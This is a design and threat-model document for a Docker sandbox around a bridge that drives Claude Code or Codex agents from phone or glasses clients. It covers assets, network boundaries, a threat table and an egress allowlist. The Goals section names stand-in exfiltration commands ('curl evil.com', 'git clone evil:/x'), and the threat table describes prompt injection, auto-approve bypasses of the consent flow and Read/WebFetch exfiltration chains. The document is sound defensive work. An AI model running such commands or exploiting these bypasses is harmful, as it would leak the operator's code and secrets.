# even-terminal-sandbox - design and threat model

## 1. Purpose

`@evenrealities/even-terminal` (henceforth ET) is an HTTP+SSE bridge that lets an
Even Realities phone/glasses client drive an autonomous Claude Code or Codex
agent on a developer's host. The agent is granted broad tool access by default,
and the upstream package ships with several auto-approval shortcuts that
materially weaken the per-call user-consent flow (see
`docs/UPSTREAM-FINDINGS.md`).

This project wraps ET in a containerized, defense-in-depth sandbox suitable for
use inside a corporate environment with the following non-goals and goals.

### Goals
- Prevent the agent - whether driven by a benign user, an attacker who holds
  the bridge token, or a prompt-injection payload - from reading or modifying
  anything on the host outside an explicitly mounted project directory.
- Constrain outbound network traffic from the agent to a vetted allowlist of
  endpoints, so that arbitrary HTTP exfiltration paths (`curl evil.com`,
  `WebFetch`, `git clone evil:/x`) are blocked at L3/L4.
- Ship reproducibly: pinned base image, pinned ET version, SBOM, signed images,
  and SLSA-L3 build provenance, so deployers can attest what they are running.
- Be portable across the developer's macOS workstation (Docker Desktop) and
  corporate Linux servers on both amd64 and arm64.

### Non-goals
- Prevent prompt-driven data exfiltration via the LLM endpoint itself. Anything
  the agent's `Read` tool can see can be encoded into a prompt and shipped to
  the model provider as part of normal operation. The sandbox limits **what
  Read can see** but does not interpose on Anthropic / OpenAI traffic.
- Mediate the consent flow between agent and operator. The sandbox does not
  patch ET; it accepts ET's behavior as a given and contains its blast radius.
  (If ET fixes its auto-approve bypasses upstream, this sandbox remains useful;
  if it doesn't, this sandbox is the only line of defense.)
- Protect against a malicious host kernel or hypervisor.

## 2. Assets

| Asset | Where it lives | Sensitivity |
|---|---|---|
| Anthropic / OpenAI API key | Docker secret, mounted file `/run/secrets/anthropic_api_key` | High - paid access, can read prompts |
| Bridge token | Docker secret, mounted file `/run/secrets/bridge_token` | High - grants full agent control |
| Project source code | Bind mount at `/work`, host-owned | Medium-High depending on project |
| Operator's SSH keys, cloud creds, dotfiles | Host `$HOME`, NOT mounted | High - must remain inaccessible |
| Operator's other Claude/Codex session history | Host `~/.claude`, `~/.codex`, NOT mounted | Medium - contains prior prompts and outputs |
| Container session state | Named volume `even-claude-state` | Medium - agent persisted memory |

## 3. Trust boundaries

```
  ┌─────────────────────────────────── Operator host ────────────────────────────────────────┐
  │                                                                                          │
  │   Phone / glasses ──── Tailscale ──► host 127.0.0.1:3456 ◄── docker port publish         │
  │                                                                  │                       │
  │                                                                  ▼                       │
  │   ┌────────────────────────────────────────────────────────────────────────────────┐     │
  │   │                                                                                │     │
  │   │   ┌────────────────────┐    TCP    ┌──────────────────────┐  HTTP    ┌────────────┐  │
  │   │   │  publisher         │  forward  │  bridge              │  proxy   │  egress    │──┼──► Internet
  │   │   │  (alpine/socat)    │ ────────► │  (even-terminal,     │ ───────► │  proxy     │  │   (allowlist
  │   │   │  uid 65534         │           │   uid 10001)         │          │  tinyproxy │  │    only)
  │   │   │  caps: none        │           │  ro rootfs, no caps  │          │  uid 10001 │  │
  │   │   │  nets: app+publish │           │  net: app (internal) │          │  nets:     │  │
  │   │   └────────────────────┘           └────────┬─────────────┘          │  app +     │  │
  │   │                                             │                        │  egress    │  │
  │   │                                    bind ro/rw                        └────────────┘  │
  │   │                                             ▼                                        │
  │   │   /work  ◄────── host: ${PROJECT_DIR}  (rw, single project only)                     │
  │   │                                                                                      │
  │   └──────────────────────────────────────────────────────────────────────────────────────┘
  │                                                                                          │
  └──────────────────────────────────────────────────────────────────────────────────────────┘
```

The bridge container sits on `app` (`internal: true`) only - it has no L3
route to the public internet. The `publisher` sidecar (a stripped-down socat
container with no shell) sits on `app` + a non-internal `publish` network so
Docker's port forwarder can reach it. The `egress-proxy` sits on `app` + a
non-internal `egress` network and is the only path out.

Trust boundaries crossed:

1. **Phone → host port 3456**: authenticated by Tailscale tailnet membership
   AND by bridge token. Port is only on loopback; reachability is granted via
   `tailscale serve`. No LAN exposure.
2. **even-terminal container → egress proxy**: HTTPS_PROXY-only egress. The
   container has no direct route to the public internet (the `app-net` network
   is `internal: true`).
3. **egress-proxy → public internet**: HTTP CONNECT to a regex-allowlisted set
   of hosts. Anything else is refused.
4. **agent process → filesystem**: only `/work` is writable on the host side.
   `/home/even` and `/tmp` are tmpfs or read-only-rootfs with small writable
   overlays. `~/.ssh`, `~/.aws`, the operator's other projects, and the
   operator's other Claude/Codex history all live on the host and are not
   visible inside the container.

## 4. Threats and mitigations

We use the categorization from the upstream findings doc. Each row also lists
the residual risk after this sandbox is applied.

| # | Threat | Sandbox mitigation | Residual |
|---|---|---|---|
| T1 | Bash auto-approve regex bypass → arbitrary shell as host user | Shell runs as uid 10001 inside read-only rootfs with `--cap-drop=ALL`, `--security-opt=no-new-privileges`, no SSH/cloud creds present. Damage is limited to `/work` + tmpfs. | Project tree itself can still be tampered with; use a fresh clone. |
| T2 | `acceptEdits` + `Read`/`WebFetch` exfil chain | `Read` cannot escape the container's filesystem; the operator's secrets aren't there. `WebFetch` egress goes through the proxy and is blocked unless the host is on the allowlist. | LLM endpoint is itself an exfil sink for whatever Read CAN see (i.e. `/work`). |
| T3 | `canUseTool` default-allow → unknown tools auto-approved | Same containment as T1/T2. New tools the SDK ships still cannot escape the container. | Same residual as T1. |
| T4 | Cross-project session enumeration via `/api/sessions` | Container has its own empty `~/.claude` named volume. The operator's real `~/.claude` is never mounted. | Sessions created inside the sandbox accumulate in the named volume; treat it as sensitive. |
| T5 | Tunnel exposure (`--expose pinggy/bore`) leaks token | `--expose` is not exposed by the sandbox entrypoint. Operator reaches the bridge via Tailscale only. | Operator can still pass `--expose` if they edit compose; documented as forbidden. |
| T6 | Token in URL query string / log leakage | Port published only to `127.0.0.1`; CORS still wide open but no untrusted browser can reach the loopback bind. Compose forces a strong token via the secret-init script. | Token still printed in container logs at startup; logs are operator-readable only. |
| T7 | 0.0.0.0 bind / wide CORS | Container's 0.0.0.0 maps to host 127.0.0.1, so LAN exposure is suppressed. | If operator publishes a different host port, they can re-expose. |
| T8 | Account info leak via `/api/info` | No mitigation - assumed acceptable inside a trusted tailnet. | Operator's Anthropic email/org/plan visible to whoever holds the token. |
| T9 | Subprocess injection via env-overridden expose-provider binaries (`PINGGY_PROGRAM_PATH`, etc.) | Container's process env is fixed at compose time; operator-controlled, not network-controlled. | Operator can still misconfigure. |
| T10 | Supply-chain compromise of ET itself or its transitive deps | Version is pinned; image is built reproducibly with `npm ci --ignore-scripts`; SBOM is published; image is keyless-signed by GitHub OIDC and carries SLSA L3 provenance. | A compromised npm registry response on build day could still poison the image; mitigated partially by lockfile + integrity hashes. |
| T11 | Container escape (kernel exploit) | `--cap-drop=ALL`, no-new-privileges, non-root, default seccomp+apparmor, read-only rootfs. On Linux, optional `runtime: runsc` (gVisor) for kernel isolation. On macOS, the Docker Desktop VM is an extra boundary. | Not zero; kernel CVEs do exist. |
| T12 | Resource exhaustion (fork bomb, memory) | `pids_limit: 256`, `mem_limit: 2g`, `cpus: 2.0`. | Operator must size for their workload; over-tight limits cause SDK timeouts. |

## 5. Architecture decisions

- **Egress proxy: mitmproxy in HTTP CONNECT mode with `--allow-hosts` regex.**
  Chosen over Squid because the regex allowlist is one flag and there is no
  config-file parser to misuse. `upstream_cert=false` keeps the proxy from
  doing TLS interception; it CONNECTs through, so the LLM TLS session is still
  end-to-end between container and provider.
- **Docker secrets, not env vars.** Compose mounts secret files into
  `/run/secrets/`. The entrypoint reads them and exports them as env vars only
  for the ET process, so they never appear in `docker inspect` output or in
  the image. `.env.example` is the public template; `.env` is gitignored.
- **Named volumes for agent state**, not bind mounts. The `~/.claude` and
  `~/.config` volumes are scoped to this stack and start empty. Operators who
  want to wipe state run `docker compose down -v`.
- **No `--expose` provider.** Pinggy/bore would put the bridge on the public
  internet with the token in the querystring (see upstream finding 5). The
  sandbox does not pass that flag. Tailscale on the host is the only supported
  remote path.
- **Tailscale runs on the host, not in the container.** Avoids embedding a
  long-lived Tailscale auth key in the image and lets the operator manage
  tailnet identity via their existing Tailscale account.
- **Multi-arch image.** linux/amd64 and linux/arm64 cover x86 corporate
  fleets, Graviton/Ampere arm64 servers, and Apple Silicon Docker Desktop.

## 6. Operator runbook (summary, see README for details)

1. `scripts/secret-init.sh` - generates `secrets/bridge_token` and prompts for
   `secrets/anthropic_api_key`. Files are mode 0600.
2. `cp .env.example .env`, edit `PROJECT_DIR` to point at the working tree the
   agent is allowed to touch. The path MUST NOT contain secrets you don't want
   the LLM provider to see.
3. `docker compose up -d`
4. `scripts/qr.sh` - prints a QR pointing at the Tailscale hostname (resolved
   via `tailscale status --json`).
5. Scan with the Even Realities phone app.

To stop and wipe agent state: `docker compose down -v`.
To verify the image you're running:
```
cosign verify ghcr.io/unbornaztecking/even-terminal-sandbox:<tag> \
  --certificate-identity-regexp '^https://github\.com/UnbornAztecKing/even-terminal-sandbox/' \
  --certificate-oidc-issuer 'https://token.actions.githubusercontent.com'
```

## 7. What this does NOT defend against

These are deliberately out of scope. Listed so operators are not surprised.

- **LLM-side exfiltration.** The model provider sees every prompt and every
  Read result. Treat `/work` as if it were posted to the provider.
- **A malicious operator.** Anyone with `docker exec` on the host can override
  any of the protections. The sandbox protects the host from the agent, not
  the agent from the operator.
- **Long-lived session-state secrets.** If the agent persists API keys or
  tokens into its own session memory, they live in the named volume until
  `down -v`. Volume access requires host privilege but is not encrypted at
  rest.
- **The fact that the upstream package has known auto-approve bypasses.** The
  sandbox limits blast radius; it does not patch ET. Track upstream for fixes.
